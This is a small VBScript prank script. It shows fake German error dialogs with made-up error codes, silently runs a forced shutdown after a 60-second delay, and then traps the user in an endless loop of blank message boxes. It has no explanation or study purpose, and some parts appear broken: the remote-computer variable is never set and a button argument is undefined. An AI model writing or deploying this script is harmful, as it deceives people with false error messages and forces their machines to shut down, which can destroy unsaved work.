msg9 = msgbox("Beim Start ist ein Fehler aufgetreten.  Pressen Sie ok um das Fenster zu beenden",o,"0x504")
msg2 = msgbox("Bitte erneut versuchen!",o,"Fehlercode: 0x00422")
msg3 = msgbox("Pressen Sie ok um das Fenster zu beenden",o,"Es ist ein Fehler aufgetreten")
msg4 = msgbox("Bitte erneut versuchen!",o,"Fehlercode: 0x00422")
msg5 = msgbox("Pressen Sie ok um das Fenster zu beenden",o,"Es ist ein Fehler aufgetreten")
msg6 = msgbox("Bitte erneut versuchen!",o,"Fehlercode: 0x00422")
msg7 = msgbox("Die Anwenung kann nicht geschlossen werden. Ihr PC wird neu gestartet",o,"Fehler: 0x277353")

 
strShutdown = "shutdown.exe -s -t 60 -f -m \\" & strComputer 
set objShell = CreateObject("WScript.Shell") 
objShell.Run strShutdown, 0, false

DO
msg8 = msgbox("",o,"")
LOOP



